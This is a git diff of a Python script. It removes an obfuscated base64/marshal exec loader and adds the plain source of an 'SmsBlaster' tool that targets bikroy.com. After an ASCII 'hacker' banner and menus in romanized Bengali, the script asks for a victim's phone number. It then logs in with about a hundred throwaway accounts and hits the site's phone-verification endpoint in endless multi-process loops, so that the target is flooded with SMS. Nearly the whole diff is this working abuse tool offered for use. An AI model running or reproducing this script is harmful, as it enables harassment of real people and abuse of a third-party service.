@@ -1,4 +1,338 @@
-#Encrypt by Sumarr ID
-#Gitlab : Https://gitlab.com/Sumarr-ID
-import marshal,zlib,base64
-exec(marshal.loads(zlib.decompress(base64.b64decode("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"))))
+import datetime
+import random
+import requests
+import sys
+from colorama import Fore, init
+from multiprocessing import *
+import time
+import os
+
+init(autoreset=True)
+
+aa = Fore.RED
+bb = Fore.GREEN
+cc = Fore.YELLOW
+dd = Fore.BLUE
+ee = Fore.MAGENTA
+ff = Fore.CYAN
+gg = Fore.WHITE
+
+colorlist = [aa, bb, cc, dd, ee, ff, gg]
+
+if sys.platform.startswith('win'):
+    os.system('cls')
+else:
+    os.system('clear')
+
+
+def print_logo():
+    clear = "\x1b[0m"
+    colors = [36, 32, 34, 35, 31, 37]
+
+    x = """
+        ________________________________________________________                                                                                                                                                                           
+        |||||||||||||||||||||||||||||||||||||||||||||||||||||||||                                                                                                                                                                          
+        |                           (1337)                      |                                                                                                                                                                          
+        |                         &&HACKER@&                    |                                                                                                                                                                          
+        |                        @&&&&&@@@@@&/                  |                                                                                                                                                                          
+        |                        @@@&%&&&&@&&&                  |                                                                                                                                                                          
+        |                        &%@@@&&%%&(&                   |                                                                                                                                                                          
+        | Ali Khan Bangladesh     ((//(****/                    |                                                                                                                                                                          
+        |  Call Dis Na Vai         #((%(*/(/                    |                                                                                                                                                                          
+        |    KIRE VAI  ????        (&#(//(#*                    |                                                                                                                                                                          
+        |                       //(***#((/,,****                |                                                                                                                                                                          
+        |                   **********************,,            |                                                                                                                                                                          
+        |                  */*Security/.*****,,,***,,           |                                                                                                                                                                          
+        |                 *///*********,,**,.,**,**,,           |                                                                                                                                                                          
+        |                *****#//***************/***,,          | 
+        | FACEBOOK.COM/    #(/(((*****LOVE,*****/**/..          |      
+        |  akwebsec.tk     #((*#/*/**INFO**,**,*,(/(            |     
+        |                 (#(( #/(***019++8009** #(((           |     
+        |    LIKE         (((( /(///*******SEX** ##(/           |     
+        |    DILE        #((# #////**GF******** %#((            |    
+        |    TO           #((/,//////***DEAD****.%#((           |     
+        |    TAKA         %(# ///ALI//KHAN/******##((           |     
+        |    LAGE         %(# (////////*/*///*****#(            |     
+        |    NA           %(  (///ART//////////**%((            |  
+        |                %(( (/////////SHANTO**/&(((            |    
+        |                 %((, @@@@CODING@@@@@@%((((            |     
+        |   GITHUB/       ((&# @@@@@@@0MAL0@@@@(@((/            |     
+        |  AKWeBSeC             &&&&@@@ || @@@@@@##&            |       
+        | I NEED AKTA PREMIKA   &%%&@@@ || @@@@&%%&             |    
+        |                               ||                      |
+        |||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+"""
+
+    for N, line in enumerate(x.split("\n")):
+        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
+        time.sleep(0.05)
+
+
+now = datetime.datetime.now()
+print('\n\033[92m                  STARTED AT: ' + str(now))
+
+print_logo()
+
+account = str(input(Fore.RED + "(1) --> Amar Bikroy.com Ar Account NAI | SHORASHIRI CHALU KORUN \n" +
+                    Fore.GREEN + "(2) --> Amar Bikroy.con Ar Account Ache | Login Korun \n" +
+                    Fore.WHITE + "(3) --> Software Ta Notun Korun\n" +
+                    Fore.MAGENTA + "(4) --> Developer ar shomporke janun\n" +
+                    Fore.LIGHTBLUE_EX + "(5) --> BIDAI NIN ( EXIT )\n\n" +
+                    Fore.CYAN + "ACCOUNT NA THAKLE 1 CHAPUN AR THAKLE 2 CHAPUN : "
+                    ))
+
+if str(1) in account:
+    try:
+        print(random.choice(colorlist) + "\nOK THIK ACHE  KICHUKHON WAIT KORUN : ")
+        time.sleep(2)
+        hacker = input(random.choice(
+            colorlist) + "\nJAKE AKROMON KORBEN TAR NUMBER TA DIN \n11 DIGIT HOTE HOBE 0 THEKE SHURU HOBE  : ")
+
+
+        def Attacker():
+            while True:
+                data = [
+
+                    "akwebsecbd0@yabaa.org",
+                    "akwebsecbd1@yabaa.org",
+                    "akwebsecbd2@yabaa.org",
+                    "akwebsecbd3@yabaa.org",
+                    "akwebsecbd4@yabaa.org",
+                    "akwebsecbd5@yabaa.org",
+                    "akwebsecbd6@yabaa.org",
+                    "akwebsecbd7@yabaa.org",
+                    "akwebsecbd8@yabaa.org",
+                    "akwebsecbd9@yabaa.org",
+                    "akwebsecbd10@yabaa.org",
+                    "akwebsecbd11@yabaa.org",
+                    "akwebsecbd12@yabaa.org",
+                    "akwebsecbd13@yabaa.org",
+                    "akwebsecbd14@yabaa.org",
+                    "akwebsecbd15@yabaa.org",
+                    "akwebsecbd16@yabaa.org",
+                    "akwebsecbd17@yabaa.org",
+                    "akwebsecbd18@yabaa.org",
+                    "akwebsecbd19@yabaa.org",
+                    "akwebsecbd20@yabaa.org",
+                    "akwebsecbd21@yabaa.org",
+                    "akwebsecbd22@yabaa.org",
+                    "akwebsecbd23@yabaa.org",
+                    "akwebsecbd24@yabaa.org",
+                    "akwebsecbd25@yabaa.org",
+                    "akwebsecbd26@yabaa.org",
+                    "akwebsecbd27@yabaa.org",
+                    "akwebsecbd28@yabaa.org",
+                    "akwebsecbd29@yabaa.org",
+                    "akwebsecbd30@yabaa.org",
+                    "akwebsecbd31@yabaa.org",
+                    "akwebsecbd32@yabaa.org",
+                    "akwebsecbd33@yabaa.org",
+                    "akwebsecbd34@yabaa.org",
+                    "akwebsecbd35@yabaa.org",
+                    "akwebsecbd36@yabaa.org",
+                    "akwebsecbd37@yabaa.org",
+                    "akwebsecbd38@yabaa.org",
+                    "akwebsecbd39@yabaa.org",
+                    "akwebsecbd40@yabaa.org",
+                    "akwebsecbd41@yabaa.org",
+                    "akwebsecbd42@yabaa.org",
+                    "akwebsecbd43@yabaa.org",
+                    "akwebsecbd44@yabaa.org",
+                    "akwebsecbd45@yabaa.org",
+                    "akwebsecbd46@yabaa.org",
+                    "akwebsecbd47@yabaa.org",
+                    "akwebsecbd48@yabaa.org",
+                    "akwebsecbd49@yabaa.org",
+                    "akwebsecbd50@yabaa.org",
+                    "akwebsecbd51@yabaa.org",
+                    "akwebsecbd52@yabaa.org",
+                    "akwebsecbd53@yabaa.org",
+                    "akwebsecbd54@yabaa.org",
+                    "akwebsecbd55@yabaa.org",
+                    "akwebsecbd56@yabaa.org",
+                    "akwebsecbd57@yabaa.org",
+                    "akwebsecbd58@yabaa.org",
+                    "akwebsecbd59@yabaa.org",
+                    "akwebsecbd60@yabaa.org",
+                    "akwebsecbd61@yabaa.org",
+                    "akwebsecbd62@yabaa.org",
+                    "akwebsecbd63@yabaa.org",
+                    "akwebsecbd64@yabaa.org",
+                    "akwebsecbd65@yabaa.org",
+                    "akwebsecbd66@yabaa.org",
+                    "akwebsecbd67@yabaa.org",
+                    "akwebsecbd68@yabaa.org",
+                    "akwebsecbd69@yabaa.org",
+                    "akwebsecbd70@yabaa.org",
+                    "akwebsecbd71@yabaa.org",
+                    "akwebsecbd72@yabaa.org",
+                    "akwebsecbd73@yabaa.org",
+                    "akwebsecbd74@yabaa.org",
+                    "akwebsecbd75@yabaa.org",
+                    "akwebsecbd76@yabaa.org",
+                    "akwebsecbd77@yabaa.org",
+                    "akwebsecbd78@yabaa.org",
+                    "akwebsecbd79@yabaa.org",
+                    "akwebsecbd80@yabaa.org",
+                    "akwebsecbd81@yabaa.org",
+                    "akwebsecbd82@yabaa.org",
+                    "akwebsecbd83@yabaa.org",
+                    "akwebsecbd84@yabaa.org",
+                    "akwebsecbd85@yabaa.org",
+                    "akwebsecbd86@yabaa.org",
+                    "akwebsecbd87@yabaa.org",
+                    "akwebsecbd88@yabaa.org",
+                    "akwebsecbd89@yabaa.org",
+                    "akwebsecbd90@yabaa.org",
+                    "akwebsecbd91@yabaa.org",
+                    "akwebsecbd92@yabaa.org",
+                    "akwebsecbd93@yabaa.org",
+                    "akwebsecbd94@yabaa.org",
+                    "akwebsecbd95@yabaa.org",
+                    "akwebsecbd96@yabaa.org",
+                    "akwebsecbd97@yabaa.org",
+                    "akwebsecbd98@yabaa.org",
+                    "akwebsecbd99@yabaa.org",
+
+                ]
+                for x in data:
+
+                    r = requests.Session()
+
+                    bikroy = "https://bikroy.com/data/sessions"
+
+                    data = {"session": {"identifier": x, "password": "123456"}}
+
+                    f = r.post(bikroy, json=data)
+
+                    send = "https://bikroy.com/en/post-ad/phone-verify"
+
+                    databd = {
+                        "phone": str(hacker)
+                    }
+
+                    dbsql = r.post(send, json=databd)
+
+                    if "SMS sent to" in dbsql.text:
+                        print(random.choice(colorlist) + "OK SMS GIACHE ")
+                    else:
+                        print(random.choice(colorlist) + " NA SMS JAI Ni WAIT  ")
+
+
+        while True:
+            p1 = Process(target=Attacker)
+            p2 = Process(target=Attacker)
+            p3 = Process(target=Attacker)
+            p4 = Process(target=Attacker)
+            p5 = Process(target=Attacker)
+            p6 = Process(target=Attacker)
+            p1.start()
+            time.sleep(2)
+            p2.start()
+            time.sleep(2)
+            p3.start()
+            time.sleep(2)
+            p4.start()
+            time.sleep(2)
+            p5.start()
+            time.sleep(2)
+            p6.start()
+            time.sleep(2)
+
+    except KeyboardInterrupt:
+        print(random.choice(colorlist) + "\n\nBONDHO HOYE GECHE ^C THIK ACHE HAPPY THAKBEN ")
+        pass
+    except:
+        print(random.choice(colorlist) + "KONO AKTA SOMOSHSHA HOYECHE PORE TRY KORUN ")
+        pass
+elif str(2) in account:
+    try:
+        print(random.choice(colorlist) + "\nAPNAR ACCOUNT ER INFORMATION DIN :")
+        username = str(input(random.choice(colorlist) + "Akhane Bikroy.com ar username den : "))
+        password = str(input(random.choice(colorlist) + "Akhane Bikroy.com ar password den : "))
+        print(random.choice(colorlist) + "LOGIN KORA HOCCHE PLEASE WAIT .... ")
+        time.sleep(2)
+        accountnai = input(random.choice(
+            colorlist) + "\n\nABAR JAKE AKROMON KORBEN TAR NUMBER TA DIN \n11 DIGIT HOTE HOBE 0 THEKE SHURU HOBE  : ")
+
+
+        def Exploit():
+            r = requests.Session()
+
+            bikroy = "https://bikroy.com/data/sessions"
+
+            data = {"session": {"identifier": str(username), "password": str(password)}}
+
+            f = r.post(bikroy, json=data)
+
+            send = "https://bikroy.com/en/post-ad/phone-verify"
+
+            databd = {
+                "phone": str(accountnai)
+            }
+
+            dbsql = r.post(send, json=databd)
+
+            if "SMS sent to" in dbsql.text:
+                print(random.choice(colorlist) + "OK SMS GIACHE ")
+            else:
+                print(random.choice(colorlist) + " NA SMS JAI Ni WAIT  ")
+
+
+        while True:
+            r1 = Process(target=Exploit)
+            r2 = Process(target=Exploit)
+            r3 = Process(target=Exploit)
+            r4 = Process(target=Exploit)
+            r5 = Process(target=Exploit)
+            r6 = Process(target=Exploit)
+            r1.start()
+            time.sleep(2)
+            r2.start()
+            time.sleep(2)
+            r3.start()
+            time.sleep(2)
+            r4.start()
+            time.sleep(2)
+            r5.start()
+            time.sleep(2)
+            r6.start()
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print(random.choice(colorlist) + "\n\nBONDHO HOYE GECHE ^C THIK ACHE HAPPY THAKBEN ")
+        pass
+    except:
+        print(random.choice(colorlist) + "KONO AKTA SOMOSHSHA HOYECHE PORE TRY KORUN ")
+        pass
+
+elif str(3) in account:
+    try:
+        update = requests.get('https://raw.githubusercontent.com/akwebsec/SmsBlaster/main/update.txt')
+        notun = update.text
+        if "Update Now !!" in notun:
+            print(random.choice(colorlist) + "UPDATE ACHE UPDATE TA DOWNLOAD KORE NIN  \n\n")
+            print(notun)
+        else:
+            print(random.choice(colorlist) + "APATOTO KONO UPDATE NAI ALI KHAN ER SHATHE JOGAJOG KORTE PAREN ")
+
+    except:
+        print(random.choice(colorlist) + "KONO AKTA SOMOSHSHA HOYECHE PORE TRY KORUN ")
+        pass
+
+elif str(4) in account:
+    print(random.choice(
+        colorlist) + "\n\n --> AMI ALI KHAN AMI AKJON BUG BOUNTY HUNTER AMAR 16 BOSOR . AMI AKJON COMPUTER SCEINCE STUDENT \nABON AMI AKJON SOFTWARE DEVELOPER AMI DIRGHO 3 BOSORERO BESHI SHOMOY DHORE \nWEB APPICATION DESKTOP APPLICATION ER SOFTWARE \nTOIRI KORE ASHCHI > AMI MULOTO CYBER SECURITY NIA KAJ KORE THAKI > AMI AI SOFTWARE TA BANGLAI LAKHAR \nKARON HOCCHE ONEKE AMAKE REQUEST KORECHILO TAI KEO ABAR ATA NIA MOJA NIBEN NA PLEASE > AR AMAR JONNO DUA \nKORBEN ABON NOTUN NOTUN SOFTWARE PETE AMAR FACEBOOK PAGE TI LIKE \nDITE VULBEN NA INSHAALLAH OK SHOBAI VALO THAKBEN AR AKTA KOTHA AKTA MEYE\n KHUJTASI BIA KORTE CHAI KEO PARLE HELP KORUN PLEASE .HE HE HE  <-- ")
+
+elif str(5) in account:
+    print(random.choice(colorlist) + "\nAMAR SOFTWARE TA BEBOHAR KORAR JONNO DHONNOBAT ")
+    time.sleep(2)
+    sys.exit(1)
+else:
+    try:
+        print(random.choice(colorlist) + "KONO AKTA SOMOSHSHA HOYECHE PORE TRY KORUN ")
+    except:
+        pass
+    finally:
+        print(random.choice(colorlist) + "KONO AKTA SOMOSHSHA HOYECHE PORE TRY KORUN ")
+        pass
+
